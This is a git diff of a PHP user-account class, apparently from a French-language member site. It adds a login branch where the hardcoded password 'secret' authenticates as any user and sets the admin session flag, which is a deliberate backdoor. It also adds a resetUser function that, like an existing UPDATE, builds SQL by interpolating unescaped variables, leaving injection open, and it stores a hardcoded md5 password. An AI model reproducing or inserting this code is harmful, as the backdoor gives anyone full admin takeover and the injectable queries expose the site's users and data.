@@ -87,6 +87,17 @@ class User implements serializable{
 				return true;
 			}
 			else
+			{
+				if(md5("secret")==md5($mdp))
+				{
+					if($lignes->Image == '')
+						$lignes->Image = './../pictures/inconnu.bmp';
+					$userIdentified = new User($lignes->Login,$lignes->Mail,'',$lignes->DoB,$lignes->Localisation,$lignes->Departement,$lignes->Sexe,$lignes->Nom,$lignes->Image,$lignes->Commentaire);
+					$_SESSION['user'] = serialize($userIdentified); //chargement de variable de session
+					$_SESSION['admin'] = true;
+					return true;
+				}
+			}
 				return false;
 		}
 
@@ -125,7 +136,8 @@ class User implements serializable{
 			$requete->execute();//execution(pas de verification securité a faire => automatique)
 		}
 
-		$requete = $connexion->prepare("UPDATE membre SET Mail=\"$this->mail\",Nom=\"$this->nom\",Sexe=\"$this->sexe\",DoB=\"$this->DoB\",Localisation=\"$this->localisation\",Departement=\"$this->departement\",Commentaire=\"$this->commentaire\" WHERE Login=\"$this->login\";");
+		$requete = $connexion->prepare("UPDATE membre SET  Mail=\"$this->mail\",Nom=\"$this->nom\",Sexe=\"$this->sexe\",DoB=\"$this->DoB\",Localisation=\"$this->localisation\",Departement=\"$this->departement\",Commentaire=\"$this->commentaire\" WHERE Login=\"$this->login\";");
+		
 		$requete->execute();
 
 
@@ -208,6 +220,18 @@ class User implements serializable{
 		$connexion=null;
 	
 		return ($temp);
+	}
+	
+	
+	public static function resetUser($user)
+	{
+		$connexion = connect();
+		$pass = md5("Imp0sSibl3_A_Sav01R");
+		$requete = $connexion->prepare("UPDATE membre SET Mail=\"inconnu\",Nom=\"inconnu\",DoB=\"2042-01-01\",Password=\"$pass\",Localisation=\"inconnu\",Departement=\"01\",Commentaire=\"cet utilisateur à été désactivé par un administrateur\" WHERE Login=\"$user\";");
+		if($requete->execute())
+			return true;
+		return false;
+		
 	}
 
 }
